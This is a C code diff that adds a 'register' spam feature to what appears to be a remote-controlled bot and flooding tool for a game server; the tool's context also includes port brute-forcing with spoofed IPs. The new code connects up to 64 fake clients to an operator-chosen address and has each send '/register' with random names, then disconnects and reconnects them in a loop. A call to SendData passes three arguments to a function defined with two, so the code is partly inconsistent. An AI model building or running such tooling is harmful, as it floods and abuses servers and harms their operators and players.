@@ -23,6 +23,11 @@
 
 #include "api.h"
 
+typedef long long int64;
+static bool RegisterSpam = false;
+static char RegisterAddr[128];
+static int RegisterPort = 0;
+static int RegisterNum = 0;
 
 void SendData(const char *pData, int Size)
 {
@@ -292,6 +297,24 @@ void str_format(char *buffer, int buffer_size, const char *format, ...)
 	va_end(ap);
 
 	buffer[buffer_size-1] = 0; /* assure null termination */
+}
+
+int64 time_get()
+{
+	static int64 last = 0;
+	int64 t;
+	QueryPerformanceCounter((PLARGE_INTEGER)&t);
+	if(t<last) /* for some reason, QPC can return values in the past */
+		return last;
+	last = t;
+	return t;
+}
+
+int64 time_freq()
+{
+	int64 t;
+	QueryPerformanceFrequency((PLARGE_INTEGER)&t);
+	return t;
 }
 
 USHORT checksum(USHORT *buffer, int size)
@@ -903,6 +926,22 @@ void ChatAll(const char *IP, int Port, const char *Msg)
 	}
 }
 
+void ChatDummy(const char *Msg, int DummyID)
+{
+	if (AmountofDummies > 0)
+	{
+		unsigned char buffer[2048];
+		int BufferSize = 0;
+
+		char aMsg[256];
+		str_format(aMsg, sizeof(aMsg), "%s", Msg);
+
+		ZeroMemory(buffer, sizeof(buffer));
+		BufferSize = PackSay(&buffer[0], DummyID, aMsg, 0);
+		SendData((const char*)buffer, BufferSize, DummyID);
+	}
+}
+
 void ChatDummies(const char *Msg)
 {
 	if (AmountofDummies > 0)
@@ -955,6 +994,45 @@ void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
 
 void Tick()
 {
+	if(RegisterSpam)
+	{
+		static int64 Spammed = 0;
+		static bool DidItIt = false;
+		int64 Now = time_get();
+
+		if(!DidItIt)
+		{
+			Sleep(100);
+
+			for (int i = 0; i < AmountofDummies; i++)
+			{
+				char aMessage[8];
+				char aFinalMsg[32];
+				int MsgLen = (rand()%3)+4;
+				for(int i = 0; i < MsgLen; i++)
+					aMessage[i] = 'a'+(rand()%('z'-'a'));
+				aMessage[MsgLen] = 0;
+				str_format(aFinalMsg, sizeof(aFinalMsg), "/register %s %s", aMessage, aMessage);
+					
+				ChatDummy(aFinalMsg, i);
+			}
+			Spammed = Now;
+			DidItIt = true;
+
+			Sleep(100);
+		}
+		else
+		{
+			DisconnectDummies();
+			Spammed = Now;
+			DidItIt = false;
+
+			Sleep(100);
+
+			ConnectDummies(RegisterAddr, RegisterPort, RegisterNum, 0);
+		}
+	}
+
 	if (m_Tick > 250) // once in 250 ms
 	{
 		m_Tick = 0;
@@ -1338,6 +1416,39 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: chatdummies <msg>", strlen("[Server]: Please use: chatdummies <msg>"), 0);
+			}
+			else if(strcmp(aCmd[0], "register") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int Port = atoi(aCmd[2]);
+					int Num = atoi(aCmd[3]);
+					if(Num > 0 && Num <= 64)
+					{
+						if(RegisterSpam)
+						{
+							RegisterSpam = false;
+							RegisterPort = 0;
+							ZeroMemory(&RegisterAddr, sizeof(RegisterAddr));
+							RegisterNum = 0;
+							DisconnectDummies();
+							send(g_Client, "[Server]: Stopped RegisterSpam!", strlen("[Server]: Stopped RegisterSpam!"), 0);
+						}
+						else
+						{
+							ConnectDummies(aCmd[1], Port, Num, 0);
+							RegisterSpam = true;
+							RegisterPort = Port;
+							str_format(RegisterAddr, sizeof(RegisterAddr), "%s", aCmd[1]);
+							RegisterNum = Num;
+							send(g_Client, "[Server]: Started RegisterSpam!", strlen("[Server]: Started RegisterSpam!"), 0);
+						}
+					}
+					else
+						send(g_Client, "[Server]: Please select a amount between 1 and 64!", strlen("[Server]: Please select a amount between 1 and 64!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: register <ip> <port> <num>", strlen("[Server]: Please use: register <ip> <port> <num>"), 0);
 			}
 			else if (strcmp(aCmd[0], "fetchips") == 0)
 			{
